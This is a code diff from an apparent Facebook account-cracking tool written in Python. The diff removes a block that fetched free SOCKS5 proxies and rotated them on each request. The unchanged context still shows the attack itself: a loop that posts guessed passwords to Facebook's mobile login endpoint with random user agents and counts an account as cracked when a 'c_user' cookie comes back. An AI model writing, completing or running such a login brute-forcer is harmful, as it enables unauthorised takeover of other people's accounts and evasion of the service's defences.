@@ -1045,18 +1045,6 @@ def gxdsFilesMenu(gxdsfiles):
             )
 
 
-# PROXIES
-try:
-    xprox = requests.get(
-        "https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all"
-    ).text
-except ProxyError:
-    print(f"{lr}  [X] INTERNET CONNECTION ERROR")
-    sys.exit()
-open(".prox.txt", "w").write(xprox)
-xprox = open(".prox.txt", "r").read().splitlines()
-
-
 # LOOP MENU
 loop = 0
 oks = []
@@ -1072,7 +1060,6 @@ def gxds_files(uid, pxss):
     session = requests.Session()
     try:
         for ps in pxss:
-            prox = random.choice(xprox)
             qwerty = random.choice(gxdsUArndm)
             gxdsfbs = session.get("https://n.facebook.com").text
             dxta = {
@@ -1114,7 +1101,6 @@ def gxds_files(uid, pxss):
                 url="https://n.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                 data=dxta,
                 headers=headxr,
-                proxies=prox,
             ).text
             lxgin = session.cookies.get_dict().keys()
             if "c_user" in lxgin:
